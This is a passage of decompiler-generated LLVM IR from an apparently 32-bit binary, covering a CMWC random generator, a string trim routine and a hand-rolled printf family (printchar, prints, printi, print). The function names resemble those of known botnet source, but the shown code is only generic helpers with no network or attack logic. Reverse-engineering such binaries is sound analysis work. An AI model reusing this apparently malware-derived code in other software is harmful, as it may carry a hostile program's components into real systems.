  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_8058210.10, align 16
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_8058210.10, align 16
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_805820c.11, align 4
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d18 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d18, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.019, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.019 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.019, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.019, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.019, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp14 = icmp slt i32 %arg3, 1
  br i1 %tmp14, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da46 = load i8, i8* %arg2, align 1
  %v4_80483dd48 = icmp eq i8 %v2_80483da46, 0
  %v1_80483df50 = icmp eq i1 %v4_80483dd48, false
  br i1 %v1_80483df50, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d752 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.051 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.051, 1
  %v5_80483d4 = add i32 %v4_80483d752, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp15 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp16 = or i32 %tmp15, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp16, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1739 = icmp slt i32 %stack_var_12.0, 1
  %tmp1840 = icmp eq i1 %tmp1739, false
  br i1 %tmp1840, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.042 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.141 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.042, 1
  %v4_804842a = add i32 %stack_var_12.141, -1
  %tmp17 = icmp slt i32 %v4_804842a, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845327 = ptrtoint i8* %arg2 to i32
  %v2_804845628 = load i8, i8* %arg2, align 1
  %v4_804845930 = icmp eq i8 %v2_804845628, 0
  %v1_804845b32 = icmp eq i1 %v4_804845930, false
  br i1 %v1_804845b32, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845335 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845327, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.134 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.033 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.033, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.134, 1
  %v5_8048450 = add i32 %v4_804845335, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1923 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp2024 = icmp eq i1 %tmp1923, false
  br i1 %tmp2024, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.226 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.325 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.226, 1
  %v4_8048474 = add i32 %stack_var_12.325, -1
  %tmp19 = icmp slt i32 %v4_8048474, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp40 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp40, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp41 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp41, align 4
  %v4_80485546 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485547 = icmp eq i32 %v4_80485546, 0
  %v1_804855814 = icmp eq i1 %v5_80485547, false
  br i1 %v1_804855814, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.015 = phi i8* [ %tmp41, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.116, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.015 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp41, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
